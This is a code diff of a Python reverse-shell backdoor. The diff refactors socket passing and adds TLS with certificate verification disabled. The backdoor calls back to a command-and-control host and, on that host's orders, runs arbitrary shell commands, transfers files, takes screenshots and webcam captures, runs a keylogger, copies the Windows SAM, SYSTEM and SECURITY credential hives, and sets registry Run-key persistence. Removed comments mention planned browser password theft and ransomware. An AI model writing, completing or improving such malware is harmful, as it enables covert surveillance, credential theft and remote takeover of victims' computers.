@@ -18,16 +18,14 @@ from mss import mss
 
 # Local application/library specific imports
 import keylogger
-# from mss import mss # mss v6.1.0
-# import requests # v2.28.0
 
 
-def reliable_send(data):
+def reliable_send(s, data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
 
 
-def reliable_recv():
+def reliable_recv(s):
     data = ''
     while True:
         try:
@@ -37,7 +35,7 @@ def reliable_recv():
             continue
 
 
-def download_file(file_name):
+def download_file(s, file_name):
     f = open(file_name, 'wb')
     s.settimeout(2)
     chunk = s.recv(1024)
@@ -51,7 +49,7 @@ def download_file(file_name):
     f.close()
 
 
-def upload_file(file_name):
+def upload_file(s, file_name):
     f = open(file_name, 'rb')
     s.send(f.read())
     f.close()
@@ -74,31 +72,28 @@ def screenshot():
             filename = screen.shot()
             os.rename(filename, '.screen.png')
 
-# TODO: screenshot other monitors
 
-
-# TODO: SAM - this code is untested
 def get_sam_dump():
     if not is_admin():
         return "You must run this function as an Administrator."
-    
+
     SAM = r'C:\Windows\System32\config\SAM'
     SYSTEM = r'C:\Windows\System32\config\SYSTEM'
     SECURITY = r'C:\Windows\System32\config\SECURITY'
-    
+
     try:
         sam_file = open(SAM, 'rb')
         system_file = open(SYSTEM, 'rb')
         security_file = open(SECURITY, 'rb')
-        
+
         sam_data = sam_file.read()
         system_data = system_file.read()
         security_data = security_file.read()
-        
+
         sam_file.close()
         system_file.close()
         security_file.close()
-        
+
         return sam_data, system_data, security_data
     except PermissionError:
         return "Insufficient permissions to access SAM, SYSTEM, or SECURITY files."
@@ -108,37 +103,31 @@ def get_sam_dump():
         return f"An unexpected error occurred: {str(e)}"
 
 
-
 def capture_webcam():
     webcam = cv2.VideoCapture(0)
     webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
 
-    # Check if the webcam is available
     if not webcam.isOpened():
         print("No webcam available")
         return
-    
+
     ret, frame = webcam.read()
 
-    # Check if the webcam was able to capture a frame
     if not ret:
         print("Failed to read frame from webcam")
         return
 
     webcam.release()
 
-    # Save the frame to a file
-    if platform == "win32" or platform == "darwin" or platform == "linux" or platform == "linux2":
-        is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
-        if is_success:
-            with open('.webcam.png', 'wb') as f:
-                f.write(im_buf_arr.tobytes())
-        else:
-            print("Failed to save webcam image")
+    is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
+    if is_success:
+        with open('.webcam.png', 'wb') as f:
+            f.write(im_buf_arr.tobytes())
+    else:
+        print("Failed to save webcam image")
 
 
-# TODO rename from persist to `reg_persist`
-def persist(reg_name, copy_name):
+def persist(s, reg_name, copy_name):
     file_location = os.environ['appdata'] + '\\' + copy_name
     try:
         if not os.path.exists(file_location):
@@ -146,17 +135,11 @@ def persist(reg_name, copy_name):
             subprocess.call(
                 r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + r' /t REG_SZ /d "' + file_location + r'"',
                 shell=True)
-
-            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
+            reliable_send(s, '[+] Created Persistence With Reg Key: ' + reg_name)
         else:
-            reliable_send('[+] Persistence Already Exists')
+            reliable_send(s, '[+] Persistence Already Exists')
     except:
-        reliable_send('[-] Error Creating Persistence With The Target Machine')
-
-
-def startup_persist(file_name):
-    pass
-    # TODO create persistence in startup folder
+        reliable_send(s, '[-] Error Creating Persistence With The Target Machine')
 
 
 def is_admin():
@@ -168,142 +151,101 @@ def is_admin():
             admin = '[!!] User Privileges!'
         else:
             admin = '[+] Administrator Privileges!'
-    elif platform == "linux" or platform == "linux2" or platform == "darwin":
-        pass
-        # TODO implmenet checking if these platforms have root/admin access
 
 
-# TODO: more elegant but relibles on an additional library
-# def is_admin():
-#     try:
-#         return ctypes.windll.shell32.IsUserAnAdmin()
-#     except:
-#         return False
-
-
-# def is_admin():
-#     global admin
-#     if platform == 'win32':
-#         try:
-#             temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
-#         except:
-#             admin = False
-#         else:
-#             admin = True
-#     elif platform == "linux" or platform == "linux2" or platform == "darwin":
-#         os.open('/etc/hosts', os.O_RDONLY)
-#         admin = True
-#         # TODO implmenet checking if these platforms have root/admin access
-#     return admin
-
-
-# def admin_string(is_admin):
-#     if(is_admin):
-#         return '[+] Administrator Privileges!'
-#     else:
-#         return '[!!] User Privileges!'
-
-
-# TODO get_chrome_passwords()
-
-# TODO get_chrome_cookies()
-
-# TODO encrypt_user_dir() ransomware element
-# TODO def encrypt_file_in_dir(file_name, key)
-# TODO def gen_key()
-# TODO def send_key(file_name, key)
-
-def shell():
+def shell(s):
     while True:
-        command = reliable_recv()
+        command = reliable_recv(s)
         if command == 'quit':
             break
-        elif command == 'background' or command == 'bg':  # BEGIN
-            pass
-        elif command == 'help':  # ideally to be removed
+        elif command == 'background' or command == 'bg':
             pass
         elif command == 'clear':
-            pass  # END
+            pass
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
-            # try:
-            #     os.chdir(command[3:])
-            #     reliable_send('[+] Changed working dir to ' + os.getcwd())
-            # except Exception as e:
-            #     reliable_send('[-] ' + str(e))
         elif command[:6] == 'upload':
-            download_file(command[7:])
+            download_file(s, command[7:])
         elif command[:8] == 'download':
-            upload_file(command[9:])
+            upload_file(s, command[9:])
         elif command[:3] == 'get':
             try:
                 download_url(command[4:])
-                reliable_send('[+] Downloaded File From Specified URL!')
+                reliable_send(s, '[+] Downloaded File From Specified URL!')
             except:
-                reliable_send('[!!] Download Failed!')
+                reliable_send(s, '[!!] Download Failed!')
         elif command[:10] == 'screenshot':
             screenshot()
-            upload_file('.screen.png')
+            upload_file(s, '.screen.png')
             os.remove('.screen.png')
         elif command[:6] == 'webcam':
             capture_webcam()
-            upload_file('.webcam.png')
+            upload_file(s, '.webcam.png')
             os.remove('.webcam.png')
         elif command[:12] == 'keylog_start':
             keylog = keylogger.Keylogger()
             t = threading.Thread(target=keylog.start)
             t.start()
-            reliable_send('[+] Keylogger Started!')
+            reliable_send(s, '[+] Keylogger Started!')
         elif command[:11] == 'keylog_dump':
             logs = keylog.read_logs()
-            reliable_send(logs)
+            reliable_send(s, logs)
         elif command[:11] == 'keylog_stop':
             keylog.self_destruct()
             t.join()
-            reliable_send('[+] Keylogger Stopped!')
+            reliable_send(s, '[+] Keylogger Stopped!')
         elif command[:11] == 'persistence':
             reg_name, copy_name = command[12:].split(' ')
-            persist(reg_name, copy_name)
+            persist(s, reg_name, copy_name)
         elif command[:7] == 'sendall':
             subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              stdin=subprocess.PIPE)
         elif command[:5] == 'check':
             try:
                 is_admin()
-                reliable_send(admin + ' platform: ' + platform)
+                reliable_send(s, admin + ' platform: ' + platform)
             except:
-                reliable_send('Cannot Perform Privilege Check! Platform: ' + platform)
+                reliable_send(s, 'Cannot Perform Privilege Check! Platform: ' + platform)
         elif command[:5] == 'start':
             try:
                 subprocess.Popen(command[6:], shell=True)
-                reliable_send('[+] Started!')
+                reliable_send(s, '[+] Started!')
             except:
-                reliable_send('[-] Failed to start!')
-        # TODO: This code is untested!
+                reliable_send(s, '[-] Failed to start!')
         elif command[:12] == 'get_sam_dump':
             sam_dump, system_dump, security_dump = get_sam_dump()
-            reliable_send((sam_dump, system_dump, security_dump))
+            reliable_send(s, (sam_dump, system_dump, security_dump))
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
             result = result.decode()
-            reliable_send(result)
+            reliable_send(s, result)
 
 
 def connection():
+    host = 'callback.scarletpug.com'
+    port = 5555
+
+    context = ssl.create_default_context()
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
+
     while True:
-        time.sleep(1)
         try:
-            s.connect(('callback.scarletpug.com', 5555))
-            # if platform == 'win32':       #TO BE DONE
-            #     persist('Backdoor', 'windows32.exe')
-            shell()
+            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s = context.wrap_socket(raw_socket)
+            s.connect((host, port))
+            shell(s)
             s.close()
             break
-        except:
-            connection()
+        except Exception as e:
+            print(f"[!] Connection error: {e}")
+            try:
+                s.close()
+            except:
+                pass
+            time.sleep(5)
 
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
